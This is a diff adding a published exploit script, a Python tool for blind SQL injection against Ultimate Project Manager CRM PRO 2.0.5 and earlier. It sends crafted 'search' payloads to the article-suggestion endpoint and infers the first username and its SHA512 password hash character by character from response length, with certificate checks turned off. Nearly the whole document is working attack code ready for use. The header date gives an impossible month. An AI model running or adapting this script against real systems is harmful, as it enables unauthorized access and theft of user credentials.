@@ -1,0 +1,103 @@
+# Exploit Title: Ultimate Project Manager CRM PRO 2.0.5 - SQLi Credentials Leakage
+# Date: 2020-16-09
+# Exploit Author: nag0mez
+# Vendor Homepage: https://ultimatepro.codexcube.com/
+# Version: <= 2.0.5
+# Tested on: Kali Linux 2020.2
+
+
+# The SQLi injection does not allow UNION payloads. However, we can guess usernames and passwords fuzzing the database.
+
+#!/usr/bin/env python3
+#-*- coding: utf-8 -*-
+import requests
+import sys
+
+# The original vulnerability was found on a server with an invalid SSL certificate,
+# which Python could not verify. I added the verify=False parameter to avoid SSL check.
+# The lack of verification results in a warning message from Python.
+# To get a clean output, we will ignore all warnings.
+import warnings
+warnings.filterwarnings("ignore")
+
+host = 'https://testurl.test' # Change
+url = "{}/frontend/get_article_suggestion/".format(host)
+
+chars = '1234567890abcdefghijklmnopqrstuvwxyz'
+hex_chars = 'abcdef1234567890'
+
+def send_payload(payload):
+	try:
+		response = requests.post(url, data=payload, verify=False)
+		content = response.text
+		length = len(content)
+		return length
+	except Exception as e:
+		print('Cannot connect to host. Exit.')
+		sys.exit(1)
+	
+
+def get_first_user():
+	found = True
+	known = ''
+
+	while found:
+
+		found = False
+		for c in chars:
+			test = known + c
+			payload = {'search': "' or (select username from tbl_users limit 1)like'{}%'-- ".format(test)}
+			length = send_payload(payload)
+
+			if length > 2:
+				found = True
+				known += c
+				print(c, end='')
+				sys.stdout.flush()
+				break
+
+	return known
+
+def get_hash(username):
+	found = True
+	known = ''
+
+	while found:
+
+		found = False
+		for c in hex_chars:
+			test = known + c
+			payload = {'search': "' or (select password from tbl_users where username='{}' limit 1)like'{}%'-- ".format(username,test)}
+			length = send_payload(payload)
+
+			if length > 2:
+				found = True
+				known += c
+				print(c, end='')
+				sys.stdout.flush()
+				break
+
+	return known
+
+
+if __name__ == '__main__':
+	print('Exploit started.')
+	print('Guessing username...')
+
+	username = get_first_user()
+
+	if username != '':
+		print('\nUsername found: {}'.format(username))
+	else:
+		print('\nCould not get username! Exit.')
+		sys.exit(1)
+
+	print('Guessing password SHA512 hash...')
+
+	sha = get_hash(username)
+
+	if sha != '':
+		print('\nHash found: {}'.format(sha))
+	else:
+		print('\nCould not get Hash! Exit.')
+		sys.exit(1)
